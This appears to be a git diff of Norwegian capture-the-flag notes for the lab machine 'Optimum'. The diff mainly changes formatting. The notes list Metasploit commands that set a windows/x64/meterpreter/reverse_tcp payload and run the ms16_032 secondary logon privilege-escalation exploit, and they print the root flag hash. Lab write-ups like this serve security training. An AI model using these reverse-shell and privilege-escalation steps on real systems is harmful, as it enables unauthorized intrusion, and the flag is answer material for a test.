@@ -1,6 +1,6 @@
 ## optimum 10.10.10.8
 
-windows server 2012 x64
+**windows server 2012 x64**
 
 nmap port 80
 
@@ -51,9 +51,7 @@ skal ikke være patchet i følge `get-hotfix`
 
 skal være mulig å execute hva som helst
 
-`set target 1 `**- viktig for å sette target til x64**
-
-
+`set target 1`**- viktig for å sette target til x64**
 
 ting som må stemme:
 
@@ -62,8 +60,6 @@ ting som må stemme:
 **må sette target til x64**
 
 **må sette payload til x64/meterpreter**
-
-
 
 `set payload windows/x64/meterpreter/reverse_tcp`
 
@@ -79,8 +75,6 @@ ting som må stemme:
 
 `exploit`
 
-
-
 `use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
 
 `set session 1`
@@ -92,8 +86,6 @@ ting som må stemme:
 `set lport 4444`
 
 `exploit`
-
-
 
 root.txt **51ed1b36553c8461f4552c2e92b3eeed**
 
